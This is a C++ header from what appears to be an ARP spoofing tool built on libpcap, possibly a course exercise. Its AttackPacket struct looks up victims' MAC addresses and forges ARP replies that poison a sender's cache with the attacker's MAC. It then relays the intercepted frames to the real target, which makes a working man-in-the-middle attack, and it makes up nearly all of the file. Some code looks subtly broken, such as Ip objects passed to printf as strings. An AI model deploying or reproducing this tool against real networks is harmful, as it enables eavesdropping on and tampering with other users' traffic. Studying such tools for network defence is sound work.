#pragma once

#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "util.h"
#include <mutex>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;

	EthArpPacket() {
		eth_.type_ = htons(EthHdr::Arp);
		arp_.hrd_ = htons(ArpHdr::ETHER);
		arp_.pro_ = htons(EthHdr::Ip4);
		arp_.op_ = htons(ArpHdr::Request);
		arp_.hln_ = Mac::SIZE;
		arp_.pln_ = Ip::SIZE;
	}

	EthArpPacket(u_char *data) {
		memcpy(&eth_, data, sizeof(EthHdr));
		memcpy(&arp_, data+sizeof(EthHdr), sizeof(ArpHdr));
	}

	EthArpPacket(int value) {
		memset(&eth_, value, sizeof(EthHdr));
		memset(&arp_, value, sizeof(ArpHdr));
	}

	template <typename T1, typename T2>
	void set_eth_mac(T1 smac, T2 dmac) {
		eth_.dmac_ = Mac(dmac);
		eth_.smac_ = Mac(smac);
	}
	template <typename T1, typename T2>
	void set_arp_mac(T1 smac, T2 dmac) {
		arp_.smac_ = Mac(smac);
		arp_.tmac_ = Mac(dmac);
	}
	template <typename T1, typename T2>
	void set_arp_ip(T1 sip, T2 tip) {
		arp_.sip_ = htonl(Ip(sip));
		arp_.tip_ = htonl(Ip(tip));
	}

	bool isNULL() {
		return (eth_.isNull() || arp_.isNull());
	}
};
struct AttackPacket final {
	Ip myIp;
	Mac myMac;
	Ip senderIp;
	Mac senderMac;
	Ip targetIp;
	Mac targetMac;
	EthArpPacket packet;
	pcap_t *handle;
	bool is_ready;

	template <typename T1, typename T2>
	AttackPacket(char *interface, pcap_t *h, T1 sip, T2 tip) {
		myIp = Ip(get_my_ip(interface));
		myMac = Mac(get_my_mac(interface));
		senderIp = string(sip);
		targetIp = string(tip);
		handle = h;
		is_ready = set_attack_Macs();
		if (is_ready) printf("[*] new Attack Flow generated (%s) (%s)\n", senderIp, targetIp);
		else printf("[*] Failed to generate new Attack flow (%s) (%s)\n", senderIp, targetIp);
	}

	void set_getMac_packet(Ip who) {
		packet.arp_.op_ = htons(ArpHdr::Request);
		packet.set_eth_mac(myMac, "ff:ff:ff:ff:ff:ff");
		packet.set_arp_ip(myIp, who);
		packet.set_arp_mac(myMac, "00:00:00:00:00:00");
	}

	void set_attack_packet() {
		packet.arp_.op_ = htons(ArpHdr::Reply);
		packet.set_eth_mac(myMac, senderMac);
		packet.set_arp_mac(myMac, senderMac);
		packet.set_arp_ip(targetIp, senderIp);
	}

	bool set_attack_Macs() {
		Mac mac;
		mac = get_mac_for_attack(senderIp);
		if (mac.isNull()) return false;
		senderMac = mac;
		mac = get_mac_for_attack(targetIp);
		if (mac.isNull()) return false;
		targetMac = mac;
		return true;
	}

	Mac get_mac_for_attack(Ip who) {
		EthArpPacket *receive;
		struct pcap_pkthdr* header;
		u_char *data;
		int res, i;
		set_getMac_packet(who);
		for (i = 0; i < 20; i++) {
			if (!(i % 10)) send_my_packet();
			res = pcap_next_ex(handle, &header, &data);
			if (res == 0) continue;
			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
				fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			receive = reinterpret_cast<EthArpPacket *>(data);
			if (is_arp_for_me(*receive)) break;
		}
		if (i == 20) return Mac(0);
		return Mac(receive->arp_.smac());
	}

	int send_my_packet() {
		return pcap_sendpacket(handle, reinterpret_cast<u_char *>(&packet), sizeof(EthArpPacket));
	}

	bool is_arp_for_me(EthArpPacket& etharp) {
		return (etharp.eth_.type() == EthHdr::Arp && \
				etharp.eth_.dmac() == myMac && \
				etharp.arp_.smac() == senderMac);
	}

	bool is_broadcast_from_sender(EthArpPacket& etharp) {
		return (etharp.eth_.dmac_.isBroadcast() && \
				etharp.eth_.smac() == senderMac && \
				etharp.arp_.tmac_.isBroadcast() && \
				etharp.arp_.smac() == senderMac);
	}

	void relay_send(vector<u_char> &data) {
		EthHdr *eth = reinterpret_cast<EthHdr*>(data.data());
		eth->dmac_ = targetMac;
		eth->smac_ = myMac;
		pcap_sendpacket(handle, data.data(), data.size());
	}
};
#pragma pack(pop)